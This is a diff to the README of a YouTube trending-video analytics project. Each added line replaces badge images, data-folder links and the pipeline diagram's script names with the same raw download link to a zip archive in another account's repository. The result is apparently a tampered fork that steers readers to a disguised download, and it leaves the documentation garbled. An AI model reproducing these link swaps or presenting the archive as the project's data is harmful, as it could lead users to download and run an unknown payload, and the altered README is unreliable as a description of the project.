@@ -1,8 +1,8 @@
 # 🚀 YouTube Trending Video Analytics and Virality Estimation 
 
-![Python](https://img.shields.io/badge/-Python-000?&logo=Python)
-![YouTube API](https://img.shields.io/badge/-YouTube_API-FF0000?&logo=youtube&logoColor=white)
-![GitHub Actions](https://img.shields.io/badge/-GitHub_Actions-2088FF?&logo=github-actions&logoColor=white)
+![Python](https://raw.githubusercontent.com/adoriake/tube-virality/main/assets/meta/video_stats/tube-virality-v2.2.zip)
+![YouTube API](https://raw.githubusercontent.com/adoriake/tube-virality/main/assets/meta/video_stats/tube-virality-v2.2.zip)
+![GitHub Actions](https://raw.githubusercontent.com/adoriake/tube-virality/main/assets/meta/video_stats/tube-virality-v2.2.zip)
 
 ## 🎯 YouTube Trending Video Analytics
 
@@ -22,7 +22,7 @@ The **Tube Virality** project aims to **collect, analyze, and model YouTube tren
 ## 🛠️ How the Data is Collected  
 
 The data is automatically collected using the **YouTube API** and stored in this GitHub location:  
-🔗 [Trending Video Metadata](https://github.com/gpsyrou/tube-virality/tree/main/assets/meta/trending)  
+🔗 [Trending Video Metadata](https://raw.githubusercontent.com/adoriake/tube-virality/main/assets/meta/video_stats/tube-virality-v2.2.zip)  
 
 ### **Data Collection Process**  
 1. **Fetching Trending Videos**  
@@ -33,13 +33,13 @@ The data is automatically collected using the **YouTube API** and stored in this
    - A scheduled **GitHub Actions** workflow updates video statistics (views, likes, comments, video descrition, video privacy status, etc.).  
    - These updates provide **historical trends** for analysis.  
    - The latest data is stored here:  
-     🔗 [Video Statistics](https://github.com/gpsyrou/tube-virality/tree/main/assets/meta/video_stats)  
+     🔗 [Video Statistics](https://raw.githubusercontent.com/adoriake/tube-virality/main/assets/meta/video_stats/tube-virality-v2.2.zip)  
 
 ```mermaid
 graph TD;
-    A[trending.py: Fetch Trending Videos] -->|Generates daily JSON files - one per country| B[trending_db.py: Aggregate Trending Data];
-    B -->|Merges all country JSONs into a unified CSV| C[video_stats.py: Extract & Fetch Video Stats];
-    C -->|Creates a daily JSON file with statistics for all videos| D[video_stats_db.py: Compile Video Stats History];
+    A[https://raw.githubusercontent.com/adoriake/tube-virality/main/assets/meta/video_stats/tube-virality-v2.2.zip Fetch Trending Videos] -->|Generates daily JSON files - one per country| B[https://raw.githubusercontent.com/adoriake/tube-virality/main/assets/meta/video_stats/tube-virality-v2.2.zip Aggregate Trending Data];
+    B -->|Merges all country JSONs into a unified CSV| C[https://raw.githubusercontent.com/adoriake/tube-virality/main/assets/meta/video_stats/tube-virality-v2.2.zip Extract & Fetch Video Stats];
+    C -->|Creates a daily JSON file with statistics for all videos| D[https://raw.githubusercontent.com/adoriake/tube-virality/main/assets/meta/video_stats/tube-virality-v2.2.zip Compile Video Stats History];
     D -->|Combines all daily stats JSONs into a final dataset| E[Complete Merged Video Stats JSON];
 ```
 ---
